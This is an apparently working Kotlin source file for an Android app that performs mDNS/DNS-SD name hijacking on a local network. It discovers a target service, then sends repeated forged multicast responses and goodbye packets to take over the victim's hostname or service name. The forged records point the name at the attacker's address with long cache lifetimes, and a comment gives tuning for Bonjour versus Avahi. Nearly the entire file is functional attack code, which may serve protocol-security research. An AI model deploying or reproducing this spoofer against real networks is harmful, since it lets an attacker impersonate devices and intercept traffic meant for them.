package com.example.mdns

import android.content.Context
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.example.mdns.MDNSHelper.Companion.constructmDNSResponse
import com.example.mdns.MDNSHelper.Companion.constructmDNSServiceAdvert
import com.example.mdns.MDNSHelper.Companion.getIPv4Address
import com.example.mdns.MDNSHelper.Companion.getIPv6Address
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.net.DatagramPacket
import java.net.Inet4Address
import java.net.Inet6Address
import java.net.InetAddress
import java.net.MulticastSocket
import java.net.SocketException
import java.util.concurrent.Executors


class NsdHelper(private val context: Context, private val socket: MulticastSocket) {

    private var nsdManager: NsdManager = context.getSystemService(Context.NSD_SERVICE) as NsdManager
    private val coroutineScope = CoroutineScope(Dispatchers.IO) // Scope for background tasks
    private val spoofedAddressV4: InetAddress? = Inet4Address.getByName("192.168.0.10")

    companion object {
        private const val TAG = "NsdHelper"
    }

    private lateinit var discoveryListener: NsdManager.DiscoveryListener
    private var attackJob: Job? = null

    fun initializeNsd() {
        initializeDiscoveryListener()
    }


    private fun initializeDiscoveryListener() {
        discoveryListener = object : NsdManager.DiscoveryListener {
            override fun onStartDiscoveryFailed(serviceType: String, errorCode: Int) {
                Log.e(TAG, "Discovery start failed: $errorCode")
                nsdManager.stopServiceDiscovery(this)
            }

            override fun onStopDiscoveryFailed(serviceType: String, errorCode: Int) {
                Log.e(TAG, "Discovery stop failed: $errorCode")
            }

            override fun onDiscoveryStarted(serviceType: String) {
                Log.d(TAG, "Discovery started: $serviceType")
            }

            override fun onDiscoveryStopped(serviceType: String) {
                Log.d(TAG, "Discovery stopped: $serviceType")
            }

            @RequiresApi(Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
            override fun onServiceFound(serviceInfo: NsdServiceInfo) {
                Log.d(TAG, "Service found: ${serviceInfo.serviceName}")
                resolveService(serviceInfo)

            }

            override fun onServiceLost(serviceInfo: NsdServiceInfo) {
                Log.e(TAG, "Service lost: ${serviceInfo.serviceName}")
            }

        }
    }

    @RequiresApi(Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
    fun resolveService(serviceInfo: NsdServiceInfo) {
        val resolveListener = object : NsdManager.ServiceInfoCallback {

            override fun onServiceInfoCallbackRegistrationFailed(info: Int) {
                Log.d(TAG, "Registration Failed. $info")
            }

            override fun onServiceUpdated(serviceInfo: NsdServiceInfo) {
                Log.d(TAG, "Resolve Succeeded. $serviceInfo")
                val array = serviceInfo.toString().split(",")
                var hostname = ""
                for (field in array) {
                    if (field.contains("hostname:")) {
                        hostname = field.substringAfter("hostname:")
                        Log.d("Hostname", "Hostname: $hostname")
                        break
                    }
                }
                val myAddress = getIPv4Address()
                val myV6Address = getIPv6Address()


                val targetIPv4Address: InetAddress? = serviceInfo.host
//                var targetIPv6Address: InetAddress? = null
//
//                for (address in serviceInfo.hostAddresses) {
//                    if (address is Inet6Address && targetIPv6Address == null && !address.isLinkLocalAddress) {
//                        targetIPv6Address = address
//                    }
//                }

                if (hostname.contains(GlobalData.expectedHostname) && targetIPv4Address != myAddress && targetIPv4Address != spoofedAddressV4) {
                    if (myAddress != null && myV6Address != null && targetIPv4Address != null) {
                        hostname += ".local"
                        hostname = hostname.replace("\\s".toRegex(), "")

                        if (!GlobalData.serviceOvertaken) {
                            GlobalData.serviceOvertaken = true
                            GlobalData.originalServiceName = serviceInfo.serviceName.replace("’","___")
                            GlobalData.originalHostname = hostname
                        }


                        if (GlobalData.implementationType == "Host") {
                            //Kill previous job and start a new one
                            attackJob?.cancel()
                            attackJob = coroutineScope.launch {
                                overtakeHostName(myAddress, myV6Address, hostname)
                            }
                        } else {
                            attackJob?.cancel()
                            attackJob = coroutineScope.launch {
                                overtakeServiceName(hostname, serviceInfo, myAddress)
                            }
                        }
                    }
                }
            }

            override fun onServiceLost() {
                Log.e(TAG, "Service Lost")
            }

            override fun onServiceInfoCallbackUnregistered() {
                Log.e(TAG, "Service Unregistered. $serviceInfo")

            }
        }

        try {
            val executor = Executors.newSingleThreadExecutor()
            nsdManager.registerServiceInfoCallback(serviceInfo, executor, resolveListener)
        } catch (e: Exception) {
            Log.e(TAG, "Error resolving service: ${e.message}")
        }
    }

    suspend fun overtakeHostName(
        myAddress: InetAddress, myV6Address: InetAddress, hostname: String
    ) {
        val mDnsGroup = InetAddress.getByName(GlobalData.mdnsAddress)


        val byteArray = constructmDNSResponse(
            myAddress.hostAddress, myV6Address.hostAddress, hostname, 3000
        )
        val sentPacket = DatagramPacket(
            byteArray, byteArray.size, mDnsGroup, GlobalData.mdnsPort
        )
        Log.d("Hostname", "Hostname: $hostname")
        for (i in 0..30) {
            try {
                socket.send(sentPacket)
            } catch (e: SocketException) {
                Log.e(TAG, "Socket is already closed")
            }
            delay(50)
        }
    }

    suspend fun overtakeServiceName(
        hostname: String, serviceInfo: NsdServiceInfo, myAddress: InetAddress
    ) {
        val mDnsGroup = InetAddress.getByName(GlobalData.mdnsAddress)

        if (!serviceInfo.serviceType.startsWith('.')) {
            serviceInfo.serviceType = ".${serviceInfo.serviceType}"
        }
        val serviceName = serviceInfo.serviceName.replace("’","___")
        var byteArray = constructmDNSServiceAdvert(
//            For Bonjour change to myAddress.hostAddress, for avahi to spoofedAddressV4?.hostAddress
            spoofedAddressV4?.hostAddress,
            serviceName,
            serviceInfo.serviceType,
            serviceInfo.port,
            hostname,
            1
        )
        val resetPacket = DatagramPacket(byteArray, byteArray.size, mDnsGroup, 5353)
        for (i in 0..3) {
            try {
                socket.send(resetPacket)
            } catch (e: SocketException) {
                Log.e(TAG, "Socket is already closed")
            }
            delay(50)
            //Advertise service
        }

        //We now receive a goodbye message, wait for 1 second so that everyone deletes their cache
        delay(1000)
        //Bind to our address again but this time have a long TTL
        byteArray = constructmDNSServiceAdvert(
            myAddress.hostAddress,
            GlobalData.originalServiceName,
            serviceInfo.serviceType,
            serviceInfo.port,
            GlobalData.originalHostname,
            3000
        )
        val advertPacket = DatagramPacket(byteArray, byteArray.size, mDnsGroup, GlobalData.mdnsPort)
       for (i in 0..3) {
            try {
                socket.send(advertPacket)
            } catch (e: SocketException) {
                Log.e(TAG, "Socket is already closed")
            }
            delay(50)
            //Advertise service
        }
    }

    fun discoverServices() {
        nsdManager.discoverServices(
            GlobalData.serviceType,
            NsdManager.PROTOCOL_DNS_SD,
            discoveryListener
        )
    }

    private fun resetGlobalValues() {
        GlobalData.originalHostname = ""
        GlobalData.serviceOvertaken = false
        GlobalData.originalServiceName = ""
        GlobalData.expectedHostname = "None"
    }

    fun tearDown() {
        try {
            attackJob?.cancel()
            resetGlobalValues()
            nsdManager.stopServiceDiscovery(discoveryListener)
            socket.close()
            socket.disconnect()
        } catch (e: IllegalArgumentException) {
            Log.e(TAG, "Service not registered")
        }
    }
}